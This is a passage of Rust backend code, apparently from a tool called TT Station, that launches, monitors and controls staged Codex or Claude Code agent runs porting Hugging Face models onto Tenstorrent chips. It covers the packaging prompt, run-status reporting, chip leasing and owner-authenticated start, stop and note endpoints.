README), then $tt-model-package-test to build it, serve it on the chips, verify the OpenAI-compatible API (tool calling \
too, if the model supports it) and stop cleanly. tt-model-manager is at {tmm} (its CLI is `tt-model`). Stage the package \
under {out} only: do NOT push, publish, or make anything public. Finally write {out}/PACKAGE.md: first the lines \
`repo_id: <namespace/name from tt-model.yaml>` and `staged_dir: <absolute path of the staged package directory>`, then \
what was verified on hardware and what wasn't.\n",
        model = run.model,
        dir = run.model_dir,
        repo = env.repo.display(),
        out = out.display(),
        tmm = home().join("code/tt-model-manager").display(),
    )
}

/// tt-model-manager's skills, where Codex and Claude look for skills.
fn link_tt_model_skills() {
    let src = home().join("code/tt-model-manager");
    for (from, to) in [
        (".codex/skills", ".codex/skills"),
        (".claude/skills", ".claude/skills"),
    ] {
        for skill in ["tt-model-yaml", "tt-model-package-test"] {
            let (a, b) = (src.join(from).join(skill), home().join(to).join(skill));
            if a.is_dir() && !b.exists() {
                let _ = std::fs::create_dir_all(home().join(to));
                let _ = std::os::unix::fs::symlink(&a, &b);
            }
        }
    }
}

/// `repo_id:` and `staged_dir:` from the package stage's PACKAGE.md.
fn package_result(run: &CodexRun) -> (Option<String>, Option<String>, Option<String>) {
    let text = std::fs::read_to_string(package_dir(run).join("out/PACKAGE.md")).ok();
    let field = |k: &str| {
        text.as_deref().and_then(|t| {
            t.lines().find_map(|l| {
                l.trim()
                    .strip_prefix(k)
                    .map(|v| v.trim().trim_matches('`').to_string())
            })
        })
    };
    (
        field("repo_id:"),
        field("staged_dir:"),
        text.map(|t| clip(&t, 6000)),
    )
}

const EXIT_MEANING: &[(i32, &str)] = &[
    (0, "All stages finished and passed their checks."),
    (3, "A stage's goal didn't complete (blocked, or a usage or budget limit)."),
    (5, "A Codex turn failed."),
    (6, "A stage failed its check, even after a fix-up attempt."),
    (7, "A stage's check script itself is broken."),
    (10, "It couldn't get the chips: gozer queued it and it gave up (fixed now: runs wait for the chips)."),
    (12, "gozer couldn't lease the chips."),
];

/// What people told a run (`notes.jsonl` in its log folder), oldest first.
fn read_notes(run: &CodexRun) -> Vec<Value> {
    std::fs::read_to_string(run.log_dir.join("notes.jsonl"))
        .unwrap_or_default()
        .lines()
        .filter_map(|l| serde_json::from_str(l).ok())
        .collect()
}

/// The runners' timestamp for now.
fn ts_now() -> String {
    let t = unix_now() as i64;
    let (days, secs) = (t.div_euclid(86_400), t.rem_euclid(86_400));
    // Civil date from days (Howard Hinnant's algorithm).
    let z = days + 719_468;
    let era = z.div_euclid(146_097);
    let doe = z - era * 146_097;
    let yoe = (doe - doe / 1460 + doe / 36_524 - doe / 146_096) / 365;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
    let mp = (5 * doy + 2) / 153;
    let d = doy - (153 * mp + 2) / 5 + 1;
    let m = if mp < 10 { mp + 3 } else { mp - 9 };
    let y = yoe + era * 400 + i64::from(m <= 2);
    format!(
        "{y:04}{m:02}{d:02}T{:02}{:02}{:02}Z",
        secs / 3600,
        secs % 3600 / 60,
        secs % 60
    )
}

/// A run as the app shows it.
pub fn describe(env: &CodexEnv, run: &CodexRun, live: bool) -> Value {
    let mut manifest = read_manifest(&run.log_dir);
    let mut prompts = env.prompts();
    // The finish line, once started, is stage 12 (its own folder and manifest).
    let pkg_prompt = package_dir(run).join(format!("prompts/{PACKAGE_STAGE}-package.txt"));
    if pkg_prompt.is_file() {
        prompts.push(pkg_prompt);
        manifest.extend(read_manifest(&package_dir(run)));
    }
    let mut current: Option<usize> = None;
    let logs_for = |i: usize| {
        let name = format!(
            "{:02}-{}",
            i + 1,
            prompts[i]
                .file_stem()
                .and_then(|s| s.to_str())
                .unwrap_or("")
        );
        let dir = if i + 1 == PACKAGE_STAGE {
            package_dir(run)
        } else {
            run.log_dir.clone()
        };
        stage_logs(&dir, &name)
    };
    let stages: Vec<Value> = prompts
        .iter()
        .enumerate()
        .map(|(i, p)| {
            let n = i + 1;
            let terminal = manifest.get(&format!("stage_{n}_terminal_status")).cloned();
            let check = manifest.get(&format!("stage_{n}_check")).cloned();
            let started = manifest.contains_key(&format!("stage_{n}_thread_id"));
            let has_gate = p.with_extension("check.sh").exists()
                || p.parent().map(|d| d.join(format!("{}.check.sh", p.file_stem().and_then(|s| s.to_str()).unwrap_or("")))).is_some_and(|x| x.exists());
            let state = match (terminal.as_deref(), check.as_deref()) {
                (Some("complete"), Some(c)) if c.starts_with("critical") || c.starts_with("check-error") => "failed",
                (Some("complete"), Some(c)) if c.starts_with("advisory") => "advisory",
                (Some("complete"), _) => "done",
                (Some(other), _) if !other.is_empty() => "stopped",
                _ if started => "running",
                _ => "waiting",
            };
            if state == "running" {
                current = Some(i);
            }
            json!({
                "n": n, "title": stage_title(p), "state": state, "goal": terminal, "check": check,
                "gate": has_gate, "thread": manifest.get(&format!("stage_{n}_thread_id")),
                "blocked_reason": manifest.get(&format!("stage_{n}_blocked_reason")).filter(|_| state == "stopped"),
                "usage": if started { stage_usage(&logs_for(i)) } else { None },
            })
        })
        .collect();
    let latest = current.or_else(|| stages.iter().rposition(|s| s["state"] != "waiting"));
    let mut events = latest
        .and_then(|i| logs_for(i).last().cloned())
        .map(|log| events_from_log(&tail_text(&log, 400_000), 40))
        .unwrap_or_default();
    // What you told it, in place among what it did.
    let notes = read_notes(run);
    if let Some(i) = latest {
        // Notes for this stage, from as far back as the feed reaches.
        let first = events
            .first()
            .and_then(|e| e["at"].as_str())
            .and_then(ts_unix)
            .unwrap_or(0);
        for n in notes.iter().filter(|n| {
            n["stage"].as_u64() == Some(i as u64 + 1) && n["at_unix"].as_u64().unwrap_or(0) >= first
        }) {
            events.push(json!({ "at": n["at"], "kind": "you", "text": n["text"] }));
        }
        events.sort_by(|a, b| a["at"].as_str().cmp(&b["at"].as_str()));
    }
    let usage_total = stages.iter().filter_map(|s| s["usage"].as_object()).fold(
        (0u64, 0u64, 0f64),
        |(i, o, c), u| {
            (
                i + u["tokens_in"].as_u64().unwrap_or(0),
                o + u["tokens_out"].as_u64().unwrap_or(0),
                c + u["cost_usd"].as_f64().unwrap_or(0.0),
            )
        },
    );
    let blocked = latest
        .filter(|_| !live)
        .and_then(|i| (stages[i]["goal"] == "blocked").then(|| json!({
            "stage": i + 1, "title": stages[i]["title"],
            "reason": stages[i]["blocked_reason"].as_str().map(str::to_string)
                .or_else(|| events.iter().rev().find(|e| e["kind"] == "says").and_then(|e| e["text"].as_str().map(str::to_string))),
        })));
    let approvals: Vec<Approval> = APPROVALS
        .lock()
        .expect("approvals")
        .iter()
        .filter(|(r, a)| r == &run.id && a.decision.is_none())
        .map(|(_, a)| a.clone())
        .collect();
    let done = stages
        .iter()
        .filter(|s| matches!(s["state"].as_str(), Some("done" | "advisory")))
        .count();
    let chips_wait: Option<Value> = std::fs::read(run.log_dir.join("chips-wait.json"))
        .ok()
        .or_else(|| std::fs::read(package_dir(run).join("chips-wait.json")).ok())
        .and_then(|b| serde_json::from_slice(&b).ok());
    let state = if live {
        if !approvals.is_empty() {
            "waiting_for_you"
        } else if chips_wait.is_some() {
            "waiting_for_chips"
        } else {
            "running"
        }
    } else if run.stopped {
        "stopped"
    } else {
        match run.exit {
            Some(0) => "finished",
            Some(_) => "failed",
            None => "stopped",
        }
    };
    let thread = latest.and_then(|i| stages[i]["thread"].as_str().map(str::to_string));
    let stage_done = |n: usize| {
        manifest
            .get(&format!("stage_{n}_terminal_status"))
            .map(String::as_str)
            == Some("complete")
    };
    let (repo_id, staged_dir, package_report) = package_result(run);
    let packaged = stage_done(PACKAGE_STAGE) && repo_id.is_some();
    let publish_log = tail_text(&package_dir(run).join("publish.log"), 4000);
    let publish_exit = std::fs::read_to_string(package_dir(run).join("publish.exit"))
        .ok()
        .map(|t| t.trim().to_string());
    let port_done = (1..=env.prompts().len()).filter(|n| stage_done(*n)).count();
    json!({
        "id": run.id, "engine": run.engine, "model": run.model, "model_dir": run.model_dir,
        "chips_held_by": chips_wait.as_ref().and_then(|w| w["held_by"].as_str().map(str::to_string)).filter(|h| !h.is_empty()),
        "last_output": tail_text(&run.log_dir.join("runner.log"), 3000).lines().rev().take(6).collect::<Vec<_>>().into_iter().rev().collect::<Vec<_>>(),
        "finish": {
            // vLLM (stage 9) passing is the earliest a port can be packaged.
            "can_package": !live && stage_done(9) && !stage_done(PACKAGE_STAGE),
            // Native vLLM straight from tt-metal, once the vLLM stage passed.
            "can_try": !live && stage_done(9),
            "serve_recipe": serve_recipe_path(env, run).is_file(),
            "packaging": live && current == Some(PACKAGE_STAGE - 1),
            "packaged": packaged,
            "repo_id": repo_id, "staged_dir": staged_dir, "report": package_report,
            "publishing": publish_exit.is_none() && !publish_log.is_empty(),
            "published": publish_exit.as_deref() == Some("0"),
            "publish_log": publish_log,
            "port_done": port_done,
        },
        "state": state, "live": live, "policy": run.policy,
        "started": run.started, "finished": run.finished,
        "exit": run.exit, "exit_meaning": run.exit.and_then(|e| EXIT_MEANING.iter().find(|(c, _)| *c == e).map(|(_, m)| *m)),
        "stages": stages, "done": done, "total": prompts.len(), "current": latest.map(|i| i + 1),
        "events": events, "approvals": approvals, "notes": notes, "blocked": blocked,
        "usage": { "tokens_in": usage_total.0, "tokens_out": usage_total.1,
                   "cost_usd": (usage_total.2 > 0.0).then_some((usage_total.2 * 100.0).round() / 100.0) },
        "log_dir": run.log_dir.display().to_string(),
        "code_dir": env.repo.join(&run.model_dir).display().to_string(),
        "cli": cli_command(env, run),
        "resume_in_terminal": thread.map(|t| if run.engine == "claude" {
            format!("cd {} && claude --resume {t}", env.repo.display())
        } else {
            format!("cd {} && codex resume {t}", env.repo.display())
        }),
    })
}

fn cli_command(env: &CodexEnv, run: &CodexRun) -> String {
    if run.engine == "claude" {
        return format!(
            "cd {} && source python_env/bin/activate && gozer run --chips 4 --who claude-bringup -- \\\n  python ~/.config/tt-station/bringup/claude_bringup.py --policy {} --log-dir /tmp/claude-bringup \\\n  --replace HF_MODEL={} --replace MODEL_DIR={} {}/*.txt",
            env.repo.display(), run.policy, run.model, run.model_dir, PROMPTS
        );
    }
    format!(
        "cd {} && source python_env/bin/activate && gozer run --chips 4 --who codex-bringup -- \\\n  python .agents/scripts/multigoal --codex-bin {} --replace HF_MODEL={} --replace MODEL_DIR={} \\\n  {}/*.txt",
        env.repo.display(),
        env.codex.clone().unwrap_or_else(|| "codex".into()),
        run.model,
        run.model_dir,
        PROMPTS
    )
}

fn live_ids(runs: &[CodexRun]) -> Vec<String> {
    runs.iter()
        .filter(|r| r.finished.is_none() && unit_active(&r.unit))
        .map(|r| r.id.clone())
        .collect()
}

/// `GET /bringup/codex/runs` (authed): newest first.
pub(crate) async fn get_runs(State(state): State<AppState>, _auth: BearerAuth) -> Json<Value> {
    let probe = state.clone();
    let runs = tokio::task::spawn_blocking(move || {
        let env = CodexEnv::detect();
        let runs = load_runs(&probe);
        let live = live_ids(&runs);
        runs.iter()
            .rev()
            .map(|r| describe(&env, r, live.contains(&r.id)))
            .collect::<Vec<_>>()
    })
    .await
    .unwrap_or_default();
    Json(json!({ "runs": runs }))
}

/// `GET /bringup/codex/runs/{id}` (authed).
pub(crate) async fn get_run(
    State(state): State<AppState>,
    _auth: BearerAuth,
    UrlPath(id): UrlPath<String>,
) -> Reply {
    let probe = state.clone();
    tokio::task::spawn_blocking(move || {
        let env = CodexEnv::detect();
        let runs = load_runs(&probe);
        let run = runs
            .iter()
            .find(|r| r.id == id)
            .ok_or_else(|| err(StatusCode::NOT_FOUND, "No such run."))?;
        Ok(Json(describe(
            &env,
            run,
            run.finished.is_none() && unit_active(&run.unit),
        )))
    })
    .await
    .map_err(|e| err(StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?
}

#[derive(Debug, Deserialize)]
pub struct StartBody {
    pub model: String,
    /// codex (default) | claude
    #[serde(default)]
    pub engine: Option<String>,
    #[serde(default)]
    pub policy: Option<String>,
    #[serde(default)]
    pub stop_serving: bool,
}

/// Free the chips for a run: refuse if something else holds them; stop the
/// serving model only when asked. Returns the model to restore afterwards.
async fn free_chips(
    state: &AppState,
    stop_serving: bool,
) -> Result<Option<String>, (StatusCode, Json<Value>)> {
    if let Some(why) = state.chips_holder() {
        return Err(err(StatusCode::CONFLICT, why));
    }
    let life = state.lifecycle();
    let split = crate::coserve::is_split(state);
    let serving = !matches!(life.phase, Phase::Idle | Phase::Failed) || split;
    let previous = life.model.clone().or(life.served_id.clone());
    if serving && !stop_serving {
        return Err((
            StatusCode::CONFLICT,
            Json(json!({
                "error": format!("A bring-up needs all four chips. Stop {} first?",
                    previous.as_deref().map(crate::notify::display_model).unwrap_or_else(|| "the model".into())),
                "needs_stop": true,
            })),
        ));
    }
    if serving {
        crate::coserve::leave_split(state).await;
        state.stop_serving().await.map_err(|e| {
            err(
                StatusCode::INTERNAL_SERVER_ERROR,
                format!("couldn't stop the model: {e:#}"),
            )
        })?;
        Ok(previous.map(|m| crate::notify::display_model(&m)))
    } else {
        Ok(None)
    }
}

/// Start the run's driver (Codex or Claude) under a whole-box gozer lease, as a
/// user systemd unit, logging into `log_dir`. `stage_args` are the runner's:
/// replacements, start/resume, prompt files.
/// Reset the chips before a run (a model that served on them leaves them in a
/// state the next runtime can't always open), as Orchard's start does.
async fn reset_chips(state: &AppState) -> Result<(), (StatusCode, Json<Value>)> {
    let st = state.clone();
    tokio::task::spawn_blocking(move || {
        st.run_power_command(crate::power::PowerAction::ResetChips, false)
    })
    .await
    .map_err(|e| err(StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?
    .map(|_| ())
    .map_err(|e| {
        err(
            StatusCode::CONFLICT,
            format!("couldn't reset the chips: {e:#}"),
        )
    })
}

/// Leases gozer shows that aren't TT Station's own serving: (holder, chips).
fn foreign_holders() -> Vec<String> {
    let out = Command::new("gozer")
        .arg("status")
        .stdin(Stdio::null())
        .output();
    let text = out
        .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
        .unwrap_or_default();
    let mut held: Vec<String> = text
        .lines()
        .filter_map(|l| {
            let rest = l.split_once("HELD")?.1;
            let who = rest
                .split_whitespace()
                .skip(1)
                .collect::<Vec<_>>()
                .join(" ");
            (!who.is_empty() && !who.starts_with("tt-station:")).then_some(who)
        })
        .collect();
    held.sort();
    held.dedup();
    held
}

/// Launch a run again from its first unfinished stage (its thread, if it has one).
fn relaunch(state: &AppState, env: &CodexEnv, run: &CodexRun) -> Result<usize, String> {
    let manifest = read_manifest(&run.log_dir);
    let prompts = env.prompts();
    let n = (1..=prompts.len())
        .find(|n| {
            manifest
                .get(&format!("stage_{n}_terminal_status"))
                .map(String::as_str)
                != Some("complete")
        })
        .ok_or("Every stage is already complete.")?;
    let mut args: Vec<String> = vec![
        "--replace".into(),
        format!("HF_MODEL={}", run.model),
        "--replace".into(),
        format!("MODEL_DIR={}", run.model_dir),
    ];
    if manifest.contains_key(&format!("stage_{n}_thread_id")) {
        args.extend(["--resume-stage".into(), n.to_string()]);
        args.extend(prompts.iter().map(|p| p.display().to_string()));
    } else {
        args.extend(["--start-index".into(), n.to_string()]);
        args.extend(prompts[n - 1..].iter().map(|p| p.display().to_string()));
    }
    let _ = std::fs::remove_file(run.log_dir.join("chips-wait.json"));
    if run.log_dir.join("note.txt").is_file() {
        args.extend([
            "--note-file".into(),
            run.log_dir.join("note.txt").display().to_string(),
        ]);
    }
    launch(state, env, run, &run.log_dir, &args)?;
    Ok(n)
}

fn launch(
    state: &AppState,
    env: &CodexEnv,
    run: &CodexRun,
    log_dir: &Path,
    stage_args: &[String],
) -> Result<(), String> {
    std::fs::create_dir_all(log_dir).map_err(|e| e.to_string())?;
    let dir = state.config_dir().join("bringup");
    for (name, body) in [
        ("codex_bringup.py", DRIVER),
        ("claude_bringup.py", CLAUDE_DRIVER),
        ("permission_mcp.py", PERMISSION_MCP),
        ("lease_run.py", LEASE_RUN),
    ] {
        std::fs::write(dir.join(name), body).map_err(|e| e.to_string())?;
    }
    let home = home();
    let venv = env.repo.join("python_env");
    let node = home.join(".local/share/node/current/bin");
    let path = std::env::join_paths([
        venv.join("bin"),
        home.join(".local/bin"),
        node,
        home.join(".tenstorrent-venv/bin"),
        PathBuf::from("/usr/local/bin"),
        PathBuf::from("/usr/bin"),
        PathBuf::from("/bin"),
    ])
    .map_err(|e| e.to_string())?;
    let q = |s: &str| format!("'{}'", s.replace('\'', "'\\''"));
    let python = q(&env.python.display().to_string());
    let log_s = q(&log_dir.display().to_string());
    let driver: Vec<String> = match run.engine.as_str() {
        "claude" => {
            let bin = claude_bin().ok_or("Claude Code isn't installed")?;
            vec![
                python,
                q(&dir.join("claude_bringup.py").display().to_string()),
                "--policy".into(),
                q(&run.policy),
                "--claude-bin".into(),
                q(&bin),
                "--log-dir".into(),
                log_s,
            ]
        }
        _ => {
            let codex = env.codex.clone().ok_or("Codex isn't installed")?;
            vec![
                python,
                q(&dir.join("codex_bringup.py").display().to_string()),
                "--policy".into(),
                q(&run.policy),
                "--".into(),
                "--codex-bin".into(),
                q(&codex),
                "--log-dir".into(),
                log_s,
            ]
        }
    };
    // Waits for the chips if they're busy (gozer would just queue and quit).
    let mut inner = vec![
        q(&env.python.display().to_string()),
        q(&dir.join("lease_run.py").display().to_string()),
        q(&log_dir.join("chips-wait.json").display().to_string()),
        q(&format!("tt-station:{}-bringup:{}", run.engine, run.model)),
        q("model bring-up"),
        "--".into(),
    ];
    inner.extend(driver);
    inner.extend(stage_args.iter().map(|a| q(a)));
    let exit_file = log_dir.join("exit");
    let _ = std::fs::remove_file(&exit_file);
    let script = format!(
        "{}; echo $? > {}",
        inner.join(" "),
        q(&exit_file.display().to_string())
    );
    let log = log_dir.join("runner.log");
    let out = Command::new("systemd-run")
        .args(["--user", "--collect", "--quiet"])
        .arg(format!("--unit={}", run.unit))
        .arg(format!(
            "--property=WorkingDirectory={}",
            env.repo.display()
        ))
        .arg(format!(
            "--property=StandardOutput=append:{}",
            log.display()
        ))
        .arg(format!("--property=StandardError=append:{}", log.display()))
        .arg(format!("--setenv=PATH={}", path.to_string_lossy()))
        .arg(format!("--setenv=HOME={}", home.display()))
        .arg(format!("--setenv=VIRTUAL_ENV={}", venv.display()))
        .arg(format!("--setenv=TT_METAL_HOME={}", env.repo.display()))
        .arg(format!("--setenv=PYTHONPATH={}", env.repo.display()))
        .arg("--setenv=PYTHONUNBUFFERED=1")
        .arg(format!(
            "--setenv=TT_STATION_URL=http://127.0.0.1:{}",
            state.ctrl_port()
        ))
        .arg(format!("--setenv=TT_STATION_RUN={}", run.id))
        // The value from systemd-run's environment, not its command line.
        .arg("--setenv=TT_STATION_RUN_SECRET")
        .env("TT_STATION_RUN_SECRET", &run.secret)
        .args(["sh", "-c", &script])
        .stdin(Stdio::null())
        .output()
        .map_err(|e| e.to_string())?;
    if !out.status.success() {
        return Err(format!(
            "couldn't start the run: {}",
            String::from_utf8_lossy(&out.stderr).trim()
        ));
    }
    Ok(())
}

/// Where stage 9 records how it served the port (TT Station asks the agent to
/// write it): `{"command": [...], "env": {...}}`.
fn serve_recipe_path(env: &CodexEnv, run: &CodexRun) -> PathBuf {
    env.repo
        .join(&run.model_dir)
        .join("doc/vllm_integration/serve.json")
}

/// The largest `max_model_len`-like number in the port's context contract.
fn contract_max_len(v: &Value) -> Option<u64> {
    match v {
        Value::Object(m) => m
            .iter()
            .filter_map(|(k, v)| {
                if k.contains("max_model_len") {
                    v.as_u64()
                } else {
                    contract_max_len(v)
                }
            })
            .max(),
        Value::Array(a) => a.iter().filter_map(contract_max_len).max(),
        _ => None,
    }
}

/// A vLLM bundle (tt-kernel's format) for a port whose vLLM stage passed, so
/// native vLLM can serve it straight from tt-metal before it's packaged.
async fn port_bundle(state: &AppState, env: &CodexEnv, run: &CodexRun) -> Result<PathBuf, String> {
    let code = env.repo.join(&run.model_dir).join("tt/generator_vllm.py");
    let src = std::fs::read_to_string(&code)
        .map_err(|_| format!("The port has no vLLM adapter yet ({}).", code.display()))?;
    let class = src
        .lines()
        .filter_map(|l| {
            l.strip_prefix("class ")
                .map(|r| r.split(['(', ':']).next().unwrap_or("").trim().to_string())
        })
        .find(|c| c.ends_with("ForCausalLM") || c.ends_with("ForConditionalGeneration"))
        .ok_or("The port's vLLM adapter has no …ForCausalLM class.")?;
    let module = format!(
        "{}.tt.generator_vllm",
        run.model_dir.trim_end_matches('/').replace('/', ".")
    );
    let info = hf_model(&run.model).await.unwrap_or(Value::Null);
    let arch = info["config"]["architectures"][0]
        .as_str()
        .map(str::to_string)
        .unwrap_or_else(|| class.trim_start_matches("TT").to_string());
    let launch = match std::fs::read(serve_recipe_path(env, run))
        .ok()
        .and_then(|b| serde_json::from_slice::<Value>(&b).ok())
    {
        Some(r) if r["command"].is_array() => json!({ "command": r["command"], "env": r["env"] }),
        _ => {
            // Not recorded (a run from before TT Station asked): the plugin's usual QB2 launch.
            let contract = std::fs::read(
                env.repo
                    .join(&run.model_dir)
                    .join("doc/context_contract.json"),
            )
            .ok()
            .and_then(|b| serde_json::from_slice::<Value>(&b).ok());
            let mut command = vec![
                "python".to_string(),
                "-m".into(),
                "vllm.entrypoints.openai.api_server".into(),
                "--model".into(),
                run.model.clone(),
                "--block_size".into(),
                "64".into(),
                "--max_num_seqs".into(),
                "1".into(),
            ];
            if let Some(n) = contract.as_ref().and_then(contract_max_len) {
                command.extend(["--max_model_len".into(), n.to_string()]);
            }
            command.extend([
                "--host".into(),
                "127.0.0.1".into(),
                "--port".into(),
                "8000".into(),
                "--served-model-name".into(),
                run.model.clone(),
                short(&run.model).to_string(),
                "--additional-config".into(),
                r#"{"tt": {"sample_on_device_mode": "all", "fabric_config": "FABRIC_1D"}}"#.into(),
            ]);
            json!({ "command": command, "env": {
                "MESH_DEVICE": "P150x4", "ARCH_NAME": "blackhole", "HF_MODEL": run.model, "VLLM_RPC_TIMEOUT": "300000",
            } })
        }
    };
    let dir = crate::native_vllm::station_bundles(state)
        .join(run.model_dir.rsplit('/').next().unwrap_or(&run.id));
    std::fs::create_dir_all(&dir).map_err(|e| e.to_string())?;
    let meta = json!({
        "arch": arch,
        "main_class": format!("{module}:{class}"),
        "hf_weights": run.model,
        "description": format!("{} ported on this box by a TT Station bring-up (run {}); served from tt-metal ({}).", run.model, run.id, run.model_dir),
        "launch": { "blackhole": launch.clone(), "default": launch },
    });
    std::fs::write(
        dir.join("vllm_metadata.json"),
        serde_json::to_vec_pretty(&meta).unwrap_or_default(),
    )
    .map_err(|e| e.to_string())?;
    Ok(dir)
}

/// Where a run's finish line (package stage) lives.
fn package_dir(run: &CodexRun) -> PathBuf {
    run.log_dir.join("package")
}

/// `POST /bringup/codex/runs` (owners): start a fast-models-fast run. Its agent
/// runs commands on the box as its user, so only an owner may start one.
pub(crate) async fn post_run(
    State(state): State<AppState>,
    _owner: crate::routes::OwnerAuth,
    Json(body): Json<StartBody>,
) -> Reply<(StatusCode, Json<Value>)> {
    let model = body.model.trim().to_string();
    if !crate::orchard::valid_model(&model) {
        return Err(err(
            StatusCode::BAD_REQUEST,
            "Use a Hugging Face id like org/model-name.",
        ));
    }
    let policy = match body.policy.as_deref().unwrap_or("smart") {
        p @ ("ask" | "smart" | "auto") => p.to_string(),
        _ => {
            return Err(err(
                StatusCode::BAD_REQUEST,
                "Policy is ask, smart or auto.",
            ))
        }
    };
    if STARTING.swap(true, std::sync::atomic::Ordering::SeqCst) {
        return Err(err(StatusCode::CONFLICT, "A bring-up is already starting."));
    }
    struct Release;
    impl Drop for Release {
        fn drop(&mut self) {
            STARTING.store(false, std::sync::atomic::Ordering::SeqCst);
        }
    }
    let _release = Release;
    let engine = match body.engine.as_deref().unwrap_or("codex") {
        e @ ("codex" | "claude") => e.to_string(),
        _ => {
            return Err(err(
                StatusCode::BAD_REQUEST,
                "The engine is codex or claude.",
            ))
        }
    };
    let env = CodexEnv::detect();
    let (env2, which_engine) = (env.clone(), engine.clone());
    let ok = tokio::task::spawn_blocking(move || {
        env2.runner_ok()
            && env2.python.is_file()
            && match which_engine.as_str() {
                "claude" => claude_bin().as_deref().is_some_and(claude_signed_in),
                _ => env2.codex.is_some() && env2.signed_in(),
            }
    })
    .await
    .unwrap_or(false);
    if !ok {
        return Err(err(
            StatusCode::PRECONDITION_FAILED,
            format!(
                "{} isn't ready here: see its card in Bring-up for what's missing.",
                if engine == "claude" {
                    "Claude Code"
                } else {
                    "Codex"
                }
            ),
        ));
    }
    if state.orchard_busy() {
        return Err(err(
            StatusCode::CONFLICT,
            "An Orchard bring-up is running. One bring-up at a time.",
        ));
    }
    let probe = state.clone();
    if !tokio::task::spawn_blocking(move || live_ids(&load_runs(&probe)))
        .await
        .unwrap_or_default()
        .is_empty()
    {
        return Err(err(
            StatusCode::CONFLICT,
            "A bring-up is already running. One at a time.",
        ));
    }
    let restore = free_chips(&state, body.stop_serving).await?;
    reset_chips(&state).await?;
    let id = crate::pairing::issue_pair_id()[..10].to_string();
    let run = CodexRun {
        id: id.clone(),
        engine: engine.clone(),
        model: model.clone(),
        model_dir: model_dir(&model),
        log_dir: state.config_dir().join(format!("bringup/codex/{id}")),
        unit: format!("tt-{engine}-bringup-{id}"),
        policy,
        started: unix_now(),
        secret: crate::pairing::issue_pair_id(),
        restore,
        finished: None,
        exit: None,
        stopped: false,
    };
    let mut args: Vec<String> = vec![
        "--replace".into(),
        format!("HF_MODEL={model}"),
        "--replace".into(),
        format!("MODEL_DIR={}", run.model_dir),
    ];
    args.extend(env.prompts().iter().map(|p| p.display().to_string()));
    let (st, r, e) = (state.clone(), run.clone(), env.clone());
    tokio::task::spawn_blocking(move || launch(&st, &e, &r, &r.log_dir.clone(), &args))
        .await
        .map_err(|e| err(StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?
        .map_err(|e| err(StatusCode::INTERNAL_SERVER_ERROR, e))?;
    let mut runs = load_runs(&state);
    runs.push(run.clone());
    save_runs(&state, &runs);
    state.set_bringup_busy(true);
    crate::audit::record(
        &state,
        "host_run",
        &format!("bring-up of {model} with {engine}"),
        "ok",
    );
    state.notifier().record(Draft {
        kind: "bringup",
        title: format!("Bringing up {} with {}", short(&model), if engine == "claude" { "Claude Code" } else { "Codex" }),
        body: "Eleven stages, several hours. You'll get a notification when Codex needs you and at each stage.".into(),
    });
    Ok((StatusCode::ACCEPTED, Json(json!({ "id": id }))))
}

fn short(model: &str) -> &str {
    model.rsplit('/').next().unwrap_or(model)
}

/// `POST /bringup/codex/runs/{id}/{action}` (owners): `stop` or `resume`.
pub(crate) async fn post_action(
    State(state): State<AppState>,
    _owner: crate::routes::OwnerAuth,
    UrlPath((id, action)): UrlPath<(String, String)>,
    body: Option<Json<Value>>,
) -> Reply {
    let mut runs = load_runs(&state);
    let Some(i) = runs.iter().position(|r| r.id == id) else {
        return Err(err(StatusCode::NOT_FOUND, "No such run."));
    };
    match action.as_str() {
        "stop" => {
            let unit = runs[i].unit.clone();
            let _ = tokio::task::spawn_blocking(move || {
                Command::new("systemctl")
                    .args(["--user", "stop", &unit])
                    .status()
            })
            .await;
            runs[i].stopped = true;
            runs[i].finished = Some(unix_now());
            for (r, a) in APPROVALS.lock().expect("approvals").iter_mut() {
                if r == &id && a.decision.is_none() {
                    a.decision = Some("cancel".into());
                }
            }
            approvals_changed();
            save_runs(&state, &runs);
            state.set_bringup_busy(false);
            Ok(Json(json!({ "stopped": true })))
        }
        "resume" | "free-chips" | "tell" => {
            let env = CodexEnv::detect();
            let stop_serving = body
                .as_ref()
                .and_then(|b| b.0["stop_serving"].as_bool())
                .unwrap_or(false);
            let note = body
                .as_ref()
                .and_then(|b| b.0["text"].as_str())
                .map(str::trim)
                .unwrap_or("")
                .to_string();
            let _restarting = Restarting::new(&id);
            let probe = state.clone();
            let live = tokio::task::spawn_blocking(move || live_ids(&load_runs(&probe)))
                .await
                .unwrap_or_default()
                .contains(&id);
            if action == "tell" && !live {
                // A stopped run carries on once told: not while another one has the chips.
                let probe = state.clone();
                if !tokio::task::spawn_blocking(move || live_ids(&load_runs(&probe)))
                    .await
                    .unwrap_or_default()
                    .is_empty()
                {
                    return Err(err(StatusCode::CONFLICT, "Another bring-up is running. Answer this one when it ends, or stop it first."));
                }
            }
            if action == "tell" {
                // A note for the agent: it picks it up when the run (re)starts its stage,
                // so a running stage is interrupted and resumed in the same conversation.
                if note.is_empty() {
                    return Err(err(StatusCode::BAD_REQUEST, "Say something to tell it."));
                }
                if note.chars().count() > 4000 {
                    return Err(err(
                        StatusCode::BAD_REQUEST,
                        "That's too long (4,000 characters at most).",
                    ));
                }
                if package_dir(&runs[i]).join("prompts").is_dir() {
                    return Err(err(
                        StatusCode::CONFLICT,
                        "Notes go to the bring-up stages; the finish line can't take one yet.",
                    ));
                }
                let manifest = read_manifest(&runs[i].log_dir);
                let stage = (1..=env.prompts().len()).find(|n| {
                    manifest
                        .get(&format!("stage_{n}_terminal_status"))
                        .map(String::as_str)
                        != Some("complete")
                });
                let entry =
                    json!({ "at": ts_now(), "at_unix": unix_now(), "stage": stage, "text": note });
                let dir = runs[i].log_dir.clone();
                let written = std::fs::create_dir_all(&dir)
                    .and_then(|_| std::fs::write(dir.join("note.txt"), &note))
                    .and_then(|_| {
                        use std::io::Write;
                        let mut f = std::fs::OpenOptions::new()
                            .create(true)
                            .append(true)
                            .open(dir.join("notes.jsonl"))?;
                        writeln!(f, "{entry}")
                    });
                written.map_err(|e| {
                    err(
                        StatusCode::INTERNAL_SERVER_ERROR,
                        format!("couldn't save the note: {e}"),
                    )
                })?;
                if live {
                    let unit = runs[i].unit.clone();
                    let _ = tokio::task::spawn_blocking(move || {
                        Command::new("systemctl")
                            .args(["--user", "stop", &unit])
                            .status()
                    })
                    .await;
                    for (r, a) in APPROVALS.lock().expect("approvals").iter_mut() {
                        if r == &id && a.decision.is_none() {
